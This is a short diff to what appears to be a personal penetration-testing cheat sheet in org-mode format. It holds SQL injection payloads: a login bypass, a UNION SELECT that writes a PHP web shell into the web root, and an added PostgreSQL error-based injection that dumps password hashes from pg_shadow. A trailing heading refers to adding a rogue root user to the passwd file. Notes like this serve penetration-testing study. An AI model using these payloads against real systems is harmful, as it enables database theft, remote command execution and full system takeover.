@@ -809,6 +809,10 @@ username=' UNION SELECT 'nurhodelta','password','c','d','f','a','a' -- &password
     #+begin_example
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
     #+end_example
+
+    PostgreSQL dumping password in error-based SQLi
+    #+begin_example
+' UNION SELECT null,CAST(passwd AS INT),null,null,null,null from pg_shadow --
     
 ** Linux
    Add root user to passwd file (root2:w00t)
